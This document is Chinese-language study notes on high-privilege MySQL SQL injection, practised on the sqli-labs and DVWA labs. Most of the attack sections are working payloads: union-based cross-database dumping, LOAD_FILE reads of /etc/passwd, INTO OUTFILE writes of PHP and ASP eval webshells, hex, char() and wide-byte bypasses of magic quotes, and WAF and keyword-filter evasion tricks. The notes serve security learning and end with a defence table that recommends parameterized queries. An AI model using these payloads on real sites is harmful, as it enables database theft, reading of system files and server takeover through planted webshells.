# 高权限注入 — 跨库查询、文件操作与防御绕过

## 一、知识体系总览

```
高权限注入
├── 常规查询 → 爆库 → 爆表 → 爆列 → 脱数据
├── 跨库查询 → information_schema 定位 → 库名.表名 跨库读取
└── 文件读写
    ├── 无魔术引号 → 直接 '路径' → getshell
    └── 有魔术引号 → 十六进制 / char() 绕过 → getshell

防注入手段
├── 自带防御：魔术引号 (Magic Quotes)
├── 内置函数：intval()、addslashes() 等
├── 自定义关键字过滤：select、union 等
├── WAF 防护软件：安全狗、宝塔、D盾等
└── 绕过思路：编码绕过、双写绕过、大小写、注释符变形
```

---

## 二、高权限注入

### 2.1 什么是高权限

MySQL 用户的权限决定了注入能做的事情：

| 权限 | 能做什么 |
|------|----------|
| `SELECT` | 查询数据 |
| `SELECT + INSERT/UPDATE/DELETE` | 增删改查 |
| `SELECT + FILE` | 查数据 + 文件读写 |
| `root / ALL PRIVILEGES` | 所有操作无限制 |

DVWA、sqli-labs 这类靶场为了方便学习，通常用 root 连接数据库，所以能练习跨库查询和文件读写。

### 2.2 常规查询

就是上一篇笔记讲的五步法：测注入点 → `order by` 测字段数 → `union select` 找显示位 → `information_schema` → 爆表/爆列/拖数据。

### 2.3 跨库查询

核心原理：**注入点不变，payload 中用 `库名.表名` 完全限定名去读同实例下其他数据库。**

```sql
# 普通查询：读当前库
-1' union select 1, group_concat(username,':',password), 3 from users --+

# 跨库查询：读其他库
-1' union select 1, secret_key, 3 from challenges.BESFOYL0LR --+
```

#### 跨库查询四步

```sql
-- Step 1: 查所有数据库
-1' union select 1, group_concat(schema_name), 3
  from information_schema.schemata --+

-- Step 2: 查目标库的表
-1' union select 1, group_concat(table_name), 3
  from information_schema.tables
  where table_schema='challenges' --+

-- Step 3: 查表的列
-1' union select 1, group_concat(column_name), 3
  from information_schema.columns
  where table_schema='challenges' and table_name='表名' --+

-- Step 4: 跨库读数据
-1' union select 1, <secret列>, 3
  from challenges.<随机表名> --+
```

#### sqli-labs Less-2 跨库实战

- **注入类型**：数字型（参数不带引号，不需要闭合）
- **当前库**：`security`
- **目标**：`challenges` 库中随机表名的 secret key
- **页面提示**：`Please input the ID as parameter with numeric value`

```sql
-- Less-2 跨库拿表名
?id=-1 union select 1,table_name,3
  from information_schema.tables where table_schema='challenges' --+

-- 跨库拿 secret key
?id=-1 union select 1,secret_XXXX,3
  from challenges.随机表名 --+
```

---

## 三、文件读写

### 3.1 前置条件

```sql
-- 查是否有 FILE 权限
SELECT file_priv FROM mysql.user WHERE user='当前用户';

-- 查看 secure_file_priv 配置
SHOW VARIABLES LIKE 'secure_file_priv';
-- NULL   → 禁止文件读写
-- ''     → 任意目录可读写
-- '/tmp'  → 只允许 /tmp 目录
```

### 3.2 `LOAD_FILE()` — 读文件

```sql
-- 语法：需要绝对路径
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');

-- 注入中读文件
-1' union select 1, LOAD_FILE('C:/boot.ini'), 3 --+
```

#### 读文件失败常见原因

| 原因 | 解决 |
|------|------|
| 路径错误 / 文件不存在 | 用绝对路径，Windows 注意盘符和反斜杠 |
| 没有 FILE 权限 | 无解 |
| secure_file_priv 限制 | 只能在允许的目录下读写 |
| 文件过大 | max_allowed_packet 限制，默认 1M |
| 魔术引号转义了引号 | 用十六进制绕过（见下文） |

### 3.3 `INTO OUTFILE` — 写文件（getshell）

```sql
-- 写一句话木马到 web 目录
-1' union select 1, "<?php @eval($_POST['cmd']);?>", 3
  into outfile '/var/www/html/shell.php' --+

-- Windows 下写一句话
-1' union select 1, "<%eval request('cmd')%>", 3
  into outfile 'C:/phpstudy/www/shell.asp' --+
```

#### 写 shell 成功的三个条件

1. **有 FILE 权限**
2. **知道网站绝对路径**（报错信息、phpinfo()、猜常见路径）
3. **目标目录可写**

---

## 四、魔术引号（Magic Quotes）

### 4.1 它做了什么

PHP 5.3 及以前的自带"安全"特性，对 `GET` / `POST` / `Cookie` 输入中的以下四个字符自动加反斜杠：

> `'` `"` `\` `NULL`

```
输入: ' UNION SELECT LOAD_FILE('/etc/passwd') --+
结果: \' UNION SELECT LOAD_FILE(\'/etc/passwd\') --+
```

### 4.2 为什么会阻塞注入

```sql
-- 无魔术引号 → 正常注入
SELECT * FROM users WHERE id = '-1' union select 1,2,3 --+'
-- -1' 把字符串闭合了 ✅

-- 魔术引号开启后
-- 所有 ' 变成 \' → 转义后不再能闭合字符串
-- 整个 payload 被当作一个字符串字面量 ❌
```

### 4.3 绕过方法

**方法一：十六进制编码（最常用）**

把所有需要引号的地方换成 `0x...`：

```sql
# 被拦截
-1' union select 1, LOAD_FILE('/etc/passwd'), 3 --+

# 绕过
-1' union select 1, LOAD_FILE(0x2F6574632F706173737764), 3 --+
```

Python 随手转换：

```python
>>> 'C:/boot.ini'.encode().hex()
'433a2f626f6f742e696e69'
```

**方法二：`char()` 函数拼接**

```sql
SELECT LOAD_FILE(char(47,101,116,99,47,112,97,115,115,119,100));
-- 等价于 LOAD_FILE('/etc/passwd')
```

**方法三：宽字节注入**

目标编码为 GBK 时有效：

```
%df' → addslashes 后 → %df\' → GBK 解码为 運' → 单引号被释放
```

### 4.4 一句话总结

> 魔术引号只管 `'` `"` `\` `NULL`。把字符串换成 **十六进制（0x...）** 或 **char() 函数**，它就管不着你了。

---

## 五、低版本 MySQL 注入（版本 < 5.0）

### 5.1 核心区别

MySQL 5.0 才引入了 `information_schema`。5.0 以下的版本**没有数据字典可用**，只能用暴力猜解。

```sql
-- ≥ 5.0：有 information_schema
select group_concat(table_name) from information_schema.tables where table_schema='xxx';

-- < 5.0：没有 information_schema
-- 只能拿字典暴力猜表名和列名
```

### 5.2 暴力注入流程

```sql
-- 1. 猜表名（拿常见表名字典逐个试）
?id=1' and 1=2 union select 1,2,3 from admin --+

-- 2. 猜列名（用 exists 判断列是否存在）
?id=1' and exists(select password from users) --+

-- 3. 常见表名字典
admin, users, user, member, manager, news, article, goods, order...
```

本质就是**字典爆破**，没有捷径，也没有 information_schema 那种一把梭的写法。

---

## 六、防注入手段总览

| 防御层次 | 具体手段 | 说明 |
|----------|---------|------|
| **自带防御** | 魔术引号（已废弃，5.4+ 移除） | 转义 `' " \ NULL`，可被十六进制绕过 |
| **PHP 内置函数** | `intval()`、`addslashes()`、`mysqli_real_escape_string()` | 类型强转或转义特殊字符 |
| **自定义关键字过滤** | 黑名单：select、union、or 等 | 可用大小写、双写、注释符变形绕过 |
| **WAF 防护软件** | 安全狗、宝塔 WAF、D 盾、ModSecurity | 基于规则匹配恶意 payload |
| **正确做法** | **PDO 参数化查询 / 预编译** | 数据与 SQL 结构分离，从根本上杜绝注入 |

### 常见绕过思路

```sql
-- 大小写绕过
SELECT → SeLeCt

-- 双写绕过（假设过滤只删一次关键词）
uniunionon → 删掉中间的 union → 恢复为 union

-- 注释符变形
/**/  替代空格
/*!50000select*/  绕过部分检测引擎

-- 等价替换
空格 → %0a %0d %09
and → &&
or  → ||
=   → like / regexp

-- 内联注释
/*!union*/ /*!select*/ 1,2,3
```

---

## 七、今日实操总结

| 内容 | 关键收获 |
|------|----------|
| **跨库注入** | 注入点不变，用 `库名.表名` 读同实例下其他库 |
| **sqli-labs Less-2** | 数字型注入（无需闭合引号），跨库查 `challenges.随机表` |
| **LOAD_FILE()** | 绝对路径 + FILE 权限 + secure_file_priv 允许 |
| **INTO OUTFILE** | 写 shell 需要知道网站绝对路径 |
| **魔术引号** | 转义 `' " \ NULL` → 用 **十六进制 0x...** 绕过 |
| **低版本 MySQL** | < 5.0 没有 information_schema → 字典暴力猜 |
| **防御手段** | 魔术引号 → intval → 关键字过滤 → WAF → 正确的做法是预编译 |

---

## 八、下一步

- [ ] sqli-labs Less-3 ~ Less-10（各种闭合方式）
- [ ] POST 注入、Header 注入、Cookie 注入
- [ ] 布尔盲注、时间盲注
- [ ] SQLMap 自动化工具
- [ ] 真实 CMS 漏洞复现
